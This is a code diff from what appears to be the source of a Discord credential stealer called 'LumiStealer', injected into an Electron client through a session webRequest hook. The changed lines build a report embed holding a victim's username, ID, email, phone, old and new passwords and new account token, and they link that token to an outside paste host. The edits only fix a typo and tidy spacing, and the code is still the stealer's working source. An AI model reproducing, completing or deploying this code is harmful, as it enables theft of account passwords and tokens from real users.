@@ -654,18 +654,18 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
         return true
       }
 
-onst embedNewPasswd = {
+const embedNewPasswd = {
     title: "Password Changed - LumiStealer",
     color: 0x5a0998,
     fields: [
         {
             name: "<:friends:1249813642879303711> User",
-            value: "`"+user.username+"`",
+            value: "`" + user.username + "`",
             inline: true
         },
         {
             name: "<:aaaaaaa:1249820962463944745> ID",
-            value: "`"+user.id+"`",
+            value: "`" + user.id + "`",
             inline: true
         },
         {
@@ -675,12 +675,12 @@ onst embedNewPasswd = {
         },
         {
             name: "<:emoji_54:1249821065236975686> Email",
-            value: "`"+user.email+"`",
+            value: "`" + user.email + "`",
             inline: true
         },
         {
             name: "<:c_ip2:1249821011898269706> Phone",
-            value: "`"+user.phone+"`",
+            value: "`" + user.phone + "`",
             inline: true
         },
         {
@@ -690,12 +690,12 @@ onst embedNewPasswd = {
         },
         {
             name: "Old Password",
-            value: "`"+old_passwd+"`",
+            value: "`" + old_passwd + "`",
             inline: true
         },
         {
             name: "New Password",
-            value: "`"+new_passwd+"`",
+            value: "`" + new_passwd + "`",
             inline: true
         },
         {
@@ -705,7 +705,7 @@ onst embedNewPasswd = {
         },
         {
             name: "New Token",
-            value: "||"+new_token+"||\n[Copy Token](https://paste-pgpj.onrender.com/?p="+new_token+")",
+            value: "||" + new_token + "||\n[Copy Token](https://paste-pgpj.onrender.com/?p=" + new_token + ")",
             inline: true
           },
         ],
